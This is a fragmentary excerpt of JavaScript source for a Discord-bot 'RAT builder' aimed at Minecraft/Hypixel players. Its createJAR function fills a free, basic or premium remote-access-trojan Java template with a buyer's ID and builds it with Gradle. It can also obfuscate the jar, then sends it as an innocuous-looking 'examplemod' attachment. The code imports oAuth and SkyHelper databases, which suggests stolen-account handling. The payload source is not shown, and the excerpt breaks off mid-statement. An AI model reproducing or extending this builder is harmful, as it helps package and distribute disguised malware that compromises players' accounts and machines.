...
import * as oAuthDB from "/home/cortina/code/hypixel/might be a rat/kumo-builder/kumo src/RATbuild/oAuth/database.js";
import * as SHDB from "/home/cortina/code/hypixel/might be a rat/kumo-builder/kumo src/RATbuild/SkyHelper/database.js";

const exec = util.promisify(exec1);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const { clientID, redirectURL } = JSON.parse(await readFile(new URL("/home/cortina/code/hypixel/might be a rat/kumo-builder/kumo src/RATbuild/oAuth/config.json", import.meta.url)));
...
async function createJAR(client, statusBar, interaction, ratType, ratTypeFormatted, uuid) {
  ...
  return new Promise(async function (resolve, reject) {
    var javaFile;
    if (ratType == "free") {
      javaFile = path.join(__dirname, "might be a rat/kumo-builder/kumo src/RATbuild/RAT_Builder/tempFiles/FreeMod.java");
    } else if (ratType == "basic") {
      javaFile = path.join(__dirname, "/home/cortina/code/hypixel/might be a rat/kumo-builder/kumo src/RATbuild/RAT_Builder/tempFiles/BasicMod.java");
    } else if (ratType == "premium") {
      //javaFile = path.join(__dirname, "/home/cortina/code/hypixel/might be a rat/kumo-builder/kumo src/RATbuild/RAT_Builder/tempFiles/PremiumMod.java");
      javaFile = "/home/cortina/code/hypixel/might be a rat/kumo-builder/kumo src/RATbuild/RAT_Builder/tempFiles/PremiumMod.java";
    }

    const data = await readFile(javaFile, { encoding: "utf8" });
    await writeFile("/home/cortina/code/hypixel/might be a rat/kumo-builder/kumo src/RATbuild/RAT/src/main/java/me/Aurora/ExampleMod.java", data.replace(/USER_ID_HERE/g, uuid), {
      encoding: "utf8",
    });

    const buildOutput = await exec("cd '/home/cortina/code/hypixel/might be a rat/kumo-builder/kumo src/RATbuild/RAT' && ./gradlew build");
    ...
    await delay(2000);
    if (!obfuscation) {
      const attachment = new AttachmentBuilder("/home/cortina/code/hypixel/might be a rat/kumo-builder/kumo src/RATbuild/RAT/build/libs/examplemod-1.0.jar").setName(
        `${ratTypeFormatted}-examplemod-1.0.jar`
      );

      return resolve(attachment);
    } else {
      const obfuscationOutput = await exec(
        "cd '/home/cortina/code/hypixel/might be a rat/kumo-builder/kumo src/RATbuild/RAT/build/libs' && java -jar ./obfuscator.jar --jarIn ./RAT-1.0.jar --jarOut ./RAT-1.0-out.jar"
      );
      ...
      await delay(2000);
      const attachment = new AttachmentBuilder("/home/cortina/code/hypixel/might be a rat/kumo-builder/kumo src/RATbuild/RAT/build/libs/RAT-1.0-out.jar").setName(
